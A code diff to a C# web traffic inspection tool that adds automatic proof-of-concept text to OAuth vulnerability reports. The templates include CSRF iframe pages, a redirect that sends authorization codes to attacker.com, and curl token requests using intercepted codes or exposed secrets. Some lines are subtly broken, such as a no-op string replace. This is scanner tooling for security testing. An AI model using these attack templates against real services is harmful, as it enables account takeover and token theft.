@@ -314,6 +314,16 @@ namespace WebTrafficInspector
                     {
                         sb.AppendLine($"CWE: {vuln.CWE}");
                     }
+
+                    // Generate automatic Proof of Concept (PoC)
+                    var poc = GeneratePoC(vuln, scanReport);
+                    if (!string.IsNullOrEmpty(poc))
+                    {
+                        sb.AppendLine();
+                        sb.AppendLine("═══ PROOF OF CONCEPT (PoC) ═══");
+                        sb.AppendLine(poc);
+                        sb.AppendLine("═══════════════════════════════");
+                    }
                 }
             }
             else
@@ -493,6 +503,145 @@ namespace WebTrafficInspector
         private void CloseButton_Click(object sender, RoutedEventArgs e)
         {
             Close();
+        }
+
+        private string GeneratePoC(OAuthVulnerability vuln, OAuthScanReport scanReport)
+        {
+            var poc = new StringBuilder();
+
+            switch (vuln.Type)
+            {
+                case "Missing State Parameter":
+                case "CSRF Vulnerability":
+                    poc.AppendLine("Attack Vector: CSRF Attack");
+                    poc.AppendLine("1. Create malicious HTML page:");
+                    poc.AppendLine("```html");
+                    poc.AppendLine("<!DOCTYPE html>");
+                    poc.AppendLine("<html>");
+                    poc.AppendLine("<body>");
+                    poc.AppendLine($"  <iframe src=\"{scanReport.Url.Replace("&state=", "&state=")}\"></iframe>");
+                    poc.AppendLine("</body>");
+                    poc.AppendLine("</html>");
+                    poc.AppendLine("```");
+                    poc.AppendLine("2. Send link to victim");
+                    poc.AppendLine("3. When victim clicks, attacker gains access to their account");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Account takeover, unauthorized access");
+                    break;
+
+                case "Open Redirect":
+                    poc.AppendLine("Attack Vector: Open Redirect");
+                    poc.AppendLine("1. Modify redirect_uri parameter:");
+                    poc.AppendLine($"   Original: {scanReport.Url}");
+                    poc.AppendLine($"   Malicious: {scanReport.Url.Replace("redirect_uri=", "redirect_uri=https://attacker.com&old_redirect_uri=")}");
+                    poc.AppendLine("2. Authorization code/token sent to attacker");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Authorization code interception, account takeover");
+                    break;
+
+                case "Token Leakage":
+                    poc.AppendLine("Attack Vector: Token Leakage in URL Fragment");
+                    poc.AppendLine("1. Victim accesses OAuth endpoint");
+                    poc.AppendLine("2. Token appears in URL fragment:");
+                    poc.AppendLine($"   {scanReport.Url}#access_token=LEAKED_TOKEN");
+                    poc.AppendLine("3. Token logged in browser history, referrer headers, analytics");
+                    poc.AppendLine();
+                    poc.AppendLine("Exploit:");
+                    poc.AppendLine("- Check browser history");
+                    poc.AppendLine("- Monitor analytics/logging systems");
+                    poc.AppendLine("- Intercept referrer headers");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Token theft, unauthorized API access");
+                    break;
+
+                case "Missing PKCE":
+                    poc.AppendLine("Attack Vector: Authorization Code Interception");
+                    poc.AppendLine("1. Attacker intercepts authorization code from redirect");
+                    poc.AppendLine("2. Exchange code for access token:");
+                    poc.AppendLine("```bash");
+                    poc.AppendLine("curl -X POST {token_endpoint}");
+                    poc.AppendLine("  -d 'grant_type=authorization_code'");
+                    poc.AppendLine("  -d 'code=INTERCEPTED_CODE'");
+                    poc.AppendLine($"  -d 'client_id={vuln.Evidence}'");
+                    poc.AppendLine("  -d 'redirect_uri=...'");
+                    poc.AppendLine("```");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Account takeover on public/mobile clients");
+                    break;
+
+                case "Scope Manipulation":
+                case "Privilege Escalation":
+                    poc.AppendLine("Attack Vector: Scope Escalation");
+                    poc.AppendLine("1. Modify scope parameter to request elevated privileges:");
+                    poc.AppendLine($"   Original: scope=read");
+                    poc.AppendLine($"   Malicious: scope=read+write+admin+delete");
+                    poc.AppendLine("2. If server doesn't validate, attacker gets elevated access");
+                    poc.AppendLine();
+                    poc.AppendLine("Test URLs:");
+                    poc.AppendLine($"   {scanReport.Url.Replace("scope=", "scope=admin+")}");
+                    poc.AppendLine($"   {scanReport.Url.Replace("scope=", "scope=*+")}");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Unauthorized access to privileged operations");
+                    break;
+
+                case "Client Secret Exposure":
+                    poc.AppendLine("Attack Vector: Client Secret Compromise");
+                    poc.AppendLine($"Exposed Secret: {vuln.Evidence}");
+                    poc.AppendLine();
+                    poc.AppendLine("Exploitation:");
+                    poc.AppendLine("1. Use exposed client secret to impersonate legitimate client");
+                    poc.AppendLine("2. Request tokens on behalf of other users:");
+                    poc.AppendLine("```bash");
+                    poc.AppendLine("curl -X POST {token_endpoint}");
+                    poc.AppendLine($"  -d 'client_id={vuln.Evidence}'");
+                    poc.AppendLine("  -d 'client_secret=EXPOSED_SECRET'");
+                    poc.AppendLine("  -d 'grant_type=client_credentials'");
+                    poc.AppendLine("```");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Full application compromise, data breach");
+                    break;
+
+                case "Authorization Code Reuse":
+                    poc.AppendLine("Attack Vector: Code Replay Attack");
+                    poc.AppendLine("1. Intercept authorization code from legitimate flow");
+                    poc.AppendLine("2. Replay code multiple times:");
+                    poc.AppendLine("```bash");
+                    poc.AppendLine("# Replay 1");
+                    poc.AppendLine("curl -X POST {token_endpoint} -d 'code=INTERCEPTED_CODE' ...");
+                    poc.AppendLine("# Replay 2");
+                    poc.AppendLine("curl -X POST {token_endpoint} -d 'code=INTERCEPTED_CODE' ...");
+                    poc.AppendLine("```");
+                    poc.AppendLine("3. If accepted, attacker gets multiple access tokens");
+                    poc.AppendLine();
+                    poc.AppendLine("Impact: Session fixation, multiple token generation");
+                    break;
+
+                case "Zero-Day Vulnerability":
+                    poc.AppendLine("Potential Zero-Day Vulnerability Detected!");
+                    poc.AppendLine($"Suspicious Pattern: {vuln.Evidence}");
+                    poc.AppendLine();
+                    poc.AppendLine("Investigation Steps:");
+                    poc.AppendLine("1. Analyze non-standard OAuth parameters");
+                    poc.AppendLine("2. Test parameter manipulation");
+                    poc.AppendLine("3. Check for undocumented endpoints");
+                    poc.AppendLine("4. Fuzz all parameters");
+                    poc.AppendLine();
+                    poc.AppendLine("Recommended Actions:");
+                    poc.AppendLine("- Deep security audit required");
+                    poc.AppendLine("- Test with Burp Suite/ZAP");
+                    poc.AppendLine("- Review application source code");
+                    break;
+
+                default:
+                    poc.AppendLine($"Vulnerability Type: {vuln.Type}");
+                    poc.AppendLine($"Evidence: {vuln.Evidence}");
+                    poc.AppendLine();
+                    poc.AppendLine("Manual exploitation required.");
+                    poc.AppendLine("Consult security documentation for specific attack vectors.");
+                    break;
+            }
+
+            return poc.ToString();
         }
 
         protected override void OnClosing(CancelEventArgs e)
